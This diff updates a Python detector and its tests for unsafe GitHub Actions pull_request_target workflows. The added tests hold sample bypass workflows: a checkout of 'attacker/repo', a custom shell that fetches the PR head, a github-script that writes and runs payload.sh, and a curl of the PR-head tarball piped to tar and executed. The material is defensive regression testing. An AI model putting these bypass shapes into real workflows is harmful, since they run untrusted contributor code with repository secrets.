@@ -25,21 +25,35 @@ FORBIDDEN_REF = re.compile(
     r"github\.event\.pull_request\.head\.|github\.head_ref|"
     r"github\.event\.pull_request\.merge_commit_sha|refs/pull/|\bpull/[^/\s]+/(?:head|merge)\b",
 )
-# Contexts a pull_request_target checkout may resolve its ref/repository from.
-# Anything else (PR head fields, step outputs, env indirection, inputs) fails.
-TRUSTED_CHECKOUT_CONTEXTS = (
-    "github.sha",
-    "github.ref",
-    "github.base_ref",
-    "github.repository",
-    "github.event.pull_request.base.",
-    "github.event.merge_group.",
-    "github.event.repository.",
+# Exact checkout refs a pull_request_target workflow may use (whitespace
+# normalized). Anything else, including literals, other repositories, bracket
+# indexing, format() or step outputs, fails closed.
+BASE_CHECKOUT_REFS = {
+    "${{ github.event.pull_request.base.sha || github.event.merge_group.base_sha || github.sha }}",
+    "${{ github.event.pull_request.base.sha }}",
+}
+# These resolve to the PR merge ref on pull_request/pull_request_review, so
+# they are only allowed behind the non-PR-event guard below.
+NON_PR_CHECKOUT_REFS = {
+    "${{ github.sha }}",
+    "${{ github.event.merge_group.head_sha || github.sha }}",
+}
+NON_PR_GUARD = '!contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name)'
+MERGE_REF_EVENTS = {
+    "pull_request",
+    "pull_request_review",
+    "pull_request_review_comment",
+}
+TRUSTED_REPOSITORY = "${{ github.repository }}"
+BRACKET_INDEX = re.compile(r"\[\s*['\"]([\w-]+)['\"]\s*\]")
+# Same-run artifacts only: these inputs pull artifacts from other runs/repos.
+FOREIGN_ARTIFACT_INPUTS = {"run-id", "github-token", "repository"}
+# github-script may read metadata through the API but not repository content.
+SCRIPT_CONTENT_FETCH = re.compile(
+    r"\b(?:getContent|getBlob|getTree|downloadTarballArchive|downloadZipballArchive|getArchive)\b"
+    r"|\bgithub\.request\b|\bfetch\(|\bhttps?\.(?:get|request)\(|pull_request\.head\b"
 )
 EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
-CONTEXT_PATH = re.compile(
-    r"\b(?:github|env|steps|needs|inputs|vars|matrix|job|runner|strategy|secrets)\.[\w.*-]+"
-)
 SHELL_SEPARATOR = re.compile(r"[;&|()\n`]|\$\(")
 GH_CHECKOUT = re.compile(r"(?<![\w./-])gh\s+pr\s+(?:checkout|diff)\b")
 # Step actions a pull_request_target job may use. Anything else could act on
@@ -76,19 +90,32 @@ def _triggers(workflow: dict[Any, Any]) -> set[str]:
     return names
 
 
+def _normalize(text: Any) -> str:
+    """Rewrite bracket indexing (``github['event']``) to dotted form."""
+    return BRACKET_INDEX.sub(r".\1", str(text))
+
+
+def _forbidden(text: Any) -> bool:
+    return bool(FORBIDDEN_REF.search(_normalize(text)))
+
+
+def _squash(text: Any) -> str:
+    return " ".join(str(text).split())
+
+
 def _tainted_env(*scopes: Any) -> set[str]:
     return {
         str(name)
         for scope in scopes
         if isinstance(scope, dict)
         for name, value in (scope.get("env") or {}).items()
-        if FORBIDDEN_REF.search(str(value))
+        if _forbidden(value)
     }
 
 
 def _names_pr_ref(value: Any, tainted: set[str]) -> bool:
     """An action input names PR-head content directly or via ``${{ env.X }}``."""
-    text = str(value)
+    text = _normalize(value)
     if FORBIDDEN_REF.search(text):
         return True
     return any(
@@ -99,29 +126,28 @@ def _names_pr_ref(value: Any, tainted: set[str]) -> bool:
 
 
 def _shell_names_pr_ref(line: str, tainted: set[str]) -> bool:
-    if FORBIDDEN_REF.search(line):
+    if _forbidden(line):
         return True
     return any(re.search(rf"\$\{{?{re.escape(name)}\b", line) for name in tainted)
 
 
-def _context_matches(path: str, prefix: str) -> bool:
-    if prefix.endswith("."):
-        return path.startswith(prefix)
-    return path == prefix or path.startswith(prefix + "_")
-
-
-def _untrusted_checkout_value(value: Any) -> bool:
-    text = str(value)
-    literal = EXPRESSION.sub("", text)
-    if FORBIDDEN_REF.search(literal):
-        return True
-    for expression in EXPRESSION.findall(text):
-        for path in CONTEXT_PATH.findall(expression):
-            if not any(
-                _context_matches(path, prefix) for prefix in TRUSTED_CHECKOUT_CONTEXTS
-            ):
-                return True
-    return False
+def _checkout_problems(
+    workflow: dict[Any, Any], job: dict[Any, Any], step: dict[str, Any]
+) -> list[str]:
+    with_ = step.get("with") or {}
+    problems: list[str] = []
+    if "repository" in with_ and _squash(with_["repository"]) != TRUSTED_REPOSITORY:
+        problems.append(f"untrusted repository={with_['repository']!r}")
+    ref = _squash(with_.get("ref", "${{ github.sha }}"))
+    if ref in BASE_CHECKOUT_REFS:
+        return problems
+    if ref not in NON_PR_CHECKOUT_REFS:
+        problems.append(f"untrusted ref={with_.get('ref')!r}")
+    elif _triggers(workflow) & MERGE_REF_EVENTS and not any(
+        NON_PR_GUARD in _squash(scope.get("if", "")) for scope in (job, step)
+    ):
+        problems.append(f"merge-ref-capable ref={ref!r} without the non-PR-event guard")
+    return problems
 
 
 # Inert git plumbing a job that reads PR refs may run, with the exact options
@@ -228,6 +254,10 @@ def _job_violations(
                         )
                     )
         return violations
+    for scope_name, scope in (("workflow", workflow), ("job", job)):
+        shell = ((scope.get("defaults") or {}).get("run") or {}).get("shell")
+        if shell not in (None, "bash"):
+            violations.append(f"{where} sets {scope_name} default shell {shell!r}")
     steps = [step for step in job.get("steps") or [] if isinstance(step, dict)]
     # Composite actions run their steps inside this job; inline local ones
     # recursively (A -> B -> checkout is as dangerous as a direct checkout).
@@ -282,18 +312,25 @@ def _job_violations(
             and not step_uses.startswith(ALLOWED_ACTIONS)
         ):
             violations.append(f"{label} uses unlisted action {step_uses}")
-        if step_uses.startswith("actions/github-script@") and SCRIPT_PROCESS.search(
-            str((step.get("with") or {}).get("script", ""))
-        ):
-            violations.append(f"{label} spawns processes from github-script")
-        if step_uses.startswith("actions/checkout"):
-            for field in ("ref", "repository"):
-                if field in (step.get("with") or {}) and _untrusted_checkout_value(
-                    step["with"][field]
-                ):
-                    violations.append(
-                        f"{label} checks out untrusted {field}={step['with'][field]!r}"
-                    )
+        if step_uses.startswith("actions/github-script@"):
+            body = _normalize((step.get("with") or {}).get("script", ""))
+            if SCRIPT_PROCESS.search(body):
+                violations.append(f"{label} spawns processes from github-script")
+            if SCRIPT_CONTENT_FETCH.search(body):
+                violations.append(
+                    f"{label} fetches repository content in github-script"
+                )
+        if step_uses.startswith("actions/download-artifact@"):
+            foreign = FOREIGN_ARTIFACT_INPUTS & set(step.get("with") or {})
+            if foreign:
+                violations.append(
+                    f"{label} downloads foreign artifacts via {sorted(foreign)}"
+                )
+        if step_uses.startswith("actions/checkout@"):
+            for problem in _checkout_problems(workflow, job, step):
+                violations.append(f"{label} checks out {problem}")
+        if step.get("shell") not in (None, "bash"):
+            violations.append(f"{label} uses custom shell {step.get('shell')!r}")
         # Comments are scanned too: stripping them is not quote-aware, and a
         # false positive is cheaper than a hidden command.
         script = str(step.get("run") or "").replace("\\\n", " ")
@@ -308,22 +345,32 @@ def _job_violations(
         for line in script.splitlines():
             if NETWORK_TOOL.search(line) and _shell_names_pr_ref(line, tainted):
                 violations.append(f"{label} downloads PR-head content: {line.strip()}")
+        if NETWORK_TOOL.search(script) and not re.search(
+            r"\bsha256sum\b[^\n]*\s-c\b", script
+        ):
+            # Downloads must be integrity-pinned in the same step; the head SHA
+            # is reachable through GITHUB_EVENT_PATH without naming it.
+            violations.append(f"{label} downloads without a sha256sum -c pin")
     return violations
 
 
 def pull_request_target_violations(
     workflow: dict[Any, Any], label: str, root: Path | None = ROOT
 ) -> list[str]:
-    """Return every place a pull_request_target workflow may materialize PR-head code.
+    """Flag pull_request_target workflow shapes that can bring PR-head content in.
 
-    Fail-closed allowlists rather than a deny-list: checkouts may only name
-    trusted contexts; every shell ``run:`` may only invoke git as inert
-    plumbing with allowlisted options; step actions come from a fixed
-    allowlist and github-script may not spawn processes; local reusable
-    workflows and composite actions are scanned recursively and remote
-    reusable workflows fail closed. It inspects workflow text only, so it is a
-    regression guard rather than a proof of shell or interpreter semantics
-    (for example ``python -c`` or ``eval`` that assemble git at run time).
+    Fail-closed allowlists rather than a deny-list, aimed at keeping only
+    trusted content in the privileged workspace: checkouts must use an exact
+    allowlisted ref/repository (merge-ref-capable refs only behind the non-PR
+    guard); every shell ``run:`` may invoke git only as inert plumbing with
+    allowlisted options, uses the default/bash shell, and may download only
+    with a ``sha256sum -c`` pin; step actions come from a fixed allowlist;
+    download-artifact is same-run only; github-script may neither spawn
+    processes nor fetch repository content; local reusable workflows and
+    composite actions are scanned recursively and remote reusable workflows
+    fail closed. It inspects workflow text only, so it is a regression guard,
+    not a proof of shell or interpreter semantics (commands assembled at run
+    time, e.g. ``python -c`` or ``eval``, are outside what it can see).
     """
     if "pull_request_target" not in _triggers(workflow):
         return []
@@ -681,3 +728,151 @@ def test_detector_expands_nested_composite_actions(tmp_path: Path) -> None:
         _prt([{"uses": "./.github/actions/a"}]), "synthetic", root=tmp_path
     )
     assert any("checks out untrusted ref" in v for v in violations)
+
+
+def _prt_review(steps: list[dict[str, Any]], **job: Any) -> dict[Any, Any]:
+    # pull_request_review shares the workflow but resolves github.sha to the
+    # PR merge ref.
+    return {
+        True: {"pull_request_target": {}, "pull_request_review": {}},
+        "jobs": {"j": {"steps": steps, **job}},
+    }
+
+
+_GUARD = '${{ !contains(fromJSON(\'["pull_request_target","pull_request_review"]\'), github.event_name) }}'
+
+
+@pytest.mark.parametrize(
+    "workflow",
+    [
+        # Frozen-head review round (6d7085d5) bypass shapes.
+        _prt([
+            {
+                "uses": "actions/checkout@v6",
+                "with": {"repository": "attacker/repo", "ref": "main"},
+            },
+            {"run": "bash ci/run.sh"},
+        ]),
+        _prt([
+            {
+                "uses": "actions/checkout@v6",
+                "with": {
+                    "ref": "${{ github['event']['pull_request']['head']['sha'] }}"
+                },
+            }
+        ]),
+        _prt([
+            {
+                "uses": "actions/checkout@v6",
+                "with": {
+                    "ref": "${{ format('refs/{0}/{1}/head', 'pull', github.event.number) }}"
+                },
+            }
+        ]),
+        _prt([
+            {
+                "uses": "actions/checkout@v6",
+                "with": {"ref": "${{ steps.pr.outputs.sha }}"},
+            }
+        ]),
+        _prt_review([
+            {"uses": "actions/checkout@v6", "with": {"ref": "${{ github.sha }}"}}
+        ]),
+        _prt_review([{"uses": "actions/checkout@v6"}]),
+        _prt([
+            {
+                "shell": "bash -c 'git fetch origin \"$HEAD_SHA\" && git checkout FETCH_HEAD && bash {0}'",
+                "run": "echo hi",
+            }
+        ]),
+        {
+            True: {"pull_request_target": {}},
+            "defaults": {"run": {"shell": "python {0}"}},
+            "jobs": {"j": {"steps": [{"run": "print(1)"}]}},
+        },
+        _prt([
+            {
+                "uses": "actions/github-script@v7",
+                "with": {
+                    "script": (
+                        "const {data} = await github.rest.repos.getContent({owner, repo, "
+                        "path: 'x.sh', ref: context.payload.pull_request.head.sha});"
+                        "require('fs').writeFileSync('payload.sh', Buffer.from(data.content, 'base64'));"
+                    )
+                },
+            },
+            {"run": "bash payload.sh"},
+        ]),
+        _prt([
+            {
+                "uses": "actions/download-artifact@v4",
+                "with": {
+                    "name": "x",
+                    "run-id": "123",
+                    "github-token": "${{ github.token }}",
+                },
+            },
+            {"run": "bash x/run.sh"},
+        ]),
+        _prt([
+            {
+                "run": (
+                    'SHA=$(jq -r .pull_request.head.sha "$GITHUB_EVENT_PATH")\n'
+                    'curl -sL "https://api.github.com/repos/o/r/tarball/$SHA" | tar -xz\n'
+                    "bash */run.sh"
+                )
+            }
+        ]),
+    ],
+)
+def test_detector_rejects_frozen_head_review_bypasses(workflow: dict[Any, Any]) -> None:
+    assert pull_request_target_violations(workflow, "synthetic", root=None)
+
+
+@pytest.mark.parametrize(
+    "workflow",
+    [
+        _prt_review([
+            {
+                "if": _GUARD,
+                "uses": "actions/checkout@v6",
+                "with": {"ref": "${{ github.sha }}"},
+            }
+        ]),
+        _prt_review(
+            [
+                {
+                    "uses": "actions/checkout@v6",
+                    "with": {
+                        "ref": "${{ github.event.merge_group.head_sha || github.sha }}"
+                    },
+                }
+            ],
+            **{"if": _GUARD},
+        ),
+        _prt_review([
+            {
+                "uses": "actions/checkout@v6",
+                "with": {"ref": "${{ github.event.pull_request.base.sha }}"},
+            }
+        ]),
+        _prt([
+            {
+                "run": (
+                    'curl -sSfL -o rg.tgz "https://github.com/o/r/releases/download/1/rg.tgz"\n'
+                    'echo "abc  rg.tgz" | sha256sum -c -'
+                )
+            }
+        ]),
+        _prt([
+            {
+                "uses": "actions/download-artifact@v4",
+                "with": {"name": "env", "path": "ci-fast"},
+            }
+        ]),
+    ],
+)
+def test_detector_allows_guarded_and_pinned_trusted_shapes(
+    workflow: dict[Any, Any],
+) -> None:
+    assert pull_request_target_violations(workflow, "synthetic", root=None) == []
